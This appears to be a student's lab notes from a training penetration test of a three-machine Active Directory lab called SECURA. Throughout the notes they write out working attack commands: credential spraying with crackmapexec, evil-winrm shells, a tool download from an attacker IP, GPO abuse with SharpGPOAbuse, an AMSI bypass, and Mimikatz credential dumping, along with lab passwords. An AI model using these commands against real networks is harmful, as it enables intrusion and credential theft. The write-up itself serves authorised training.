In the first Challenge Lab, you are tasked with performing a penetration test on SECURA's three-machine enterprise environment. This lab serves as a ramp-up before tackling the more complex Challenge Labs 1-3. You will exploit vulnerabilities in ManageEngine, pivot through internal services, and leverage insecure GPO permissions to escalate privileges and compromise the domain

Looks like there's a file upload section.

and a help card. gonna try to upload a .jar reverse shell. tried several different java files and none of them worked. 

burpsuite is not working for some reason either. 

Enumerate smb using #crackmapexec 

![[Pasted image 20250308103802.png]]
This use is a local admin. Let's try to psexec. 

Psexec worked.

PWNED **192.168.135.95** VM3. 

Enumerating this box. 

There is a powershell `dns.ps1` script 

![[Pasted image 20250308104705.png]]
- maybe another network `192.168.120.23`
- If IP is not `192.168.120.23` it changes it to `192.168.120.97`

Continuing enumeration

### VM2 
`192.168.135.96`

![[Pasted image 20250308112436.png]]

### VM1 is definitely the DC. 
`**192.168.135.97**` how do we get there? 

Sharphound on VM3

`iwr -uri http://192.168.45.222/SharpHound.ps1 -OutFile SharpHound.ps1`

Bloodhound.py is better.

![[Pasted image 20250308132202.png]]

Data did load into bloodhound yay! Marked eric.wallows and secure.secura.yzx as owned.

Ran "Find Shortest Path to Domain Admins"


Maybe?

![[Pasted image 20250308133051.png]]

![[Pasted image 20250308133114.png]]
Gonna try this dcsync attack. This attack is not working. 

Ran #mimikats `sekurlsa::logonpasswords`

Got cleartext password for VM2

Fail smb enum. Trying winrm. 

Nope just had to be more specific. 

`crackmapexec smb 192.168.135.96 -u apache -p 'New2Era4.!' -d era.secura.yzx --shares`

![[Pasted image 20250308141725.png]]

On winrm, we show Pwn3d!
![[Pasted image 20250308141817.png]]

Connect with evilwinrm.

`evil-winrm -i 192.168.135.96 -u apache -p 'New2Era4.!'`

Got shell.

Fuck yeah.

psexec to box.

Stop running dir lol. 

Also another user `charlotte:Game2On4.!`

Owned vm 2. 
03dd623837e4142ddf9a4b2fc335ce25

Maybe re-run bloodhound.py?

### DC time

Enumerating this version Windows Server 2016 Standard 14393 - nothing immediately interesting 

Using creds found on previous box to list smb shares

`crackmapexec smb 192.168.135.97 -u charlotte -p 'Game2On4.!' -d secura.yzx --shares`

![[Pasted image 20250309111621.png]]
May want to read some of these shares, but first going to see if charlotte has winrm access. 

She does. :) 

![[Pasted image 20250309111738.png]]

And have a shell on the box. 

`evil-winrm -i 192.168.135.97 -u charlotte -p 'Game2On4.!'`

We have SeImpersonatePrivilege

![[Pasted image 20250309112038.png]]

This `SharpGPOAbuse.exe` is already in charlotte's documents..

![[Pasted image 20250309112325.png]]

Want to enumerate using PowerView. 

![[Pasted image 20250309113231.png]]
Check permissions charlotte has over this policy

`Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName charlotte`

We do have useful permissions over the policy 

![[Pasted image 20250309113517.png]]

Now execute `SharpGPOAbuse.exe` to add current user to local admin group.

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
```

![[Pasted image 20250309113759.png]]

Now, force update the policy with 

```
gpupdate /force
```

![[Pasted image 20250309113943.png]]

Verify we're an admin

```
net localgroup administrators
```

![[Pasted image 20250309114036.png]]

Added user as owned in Bloodhound but graph still kind of confusing. Maybe retry mimikatz DCSync attack?

transfer mimikatz to target. 

Need to Use mimikatz.ps1 in `~/Tools/AD-Enum/Powersploit/Exfiltration/`

`*Evil-WinRM* PS C:\Users\TEMP\Documents> Bypass-4MSI`

`*Evil-WinRM* PS C:\Users\TEMP\Documents> . .\Invoke-Mimikatz.ps1`

`C:\Users\TEMP\Documents> Invoke-Mimikatz`
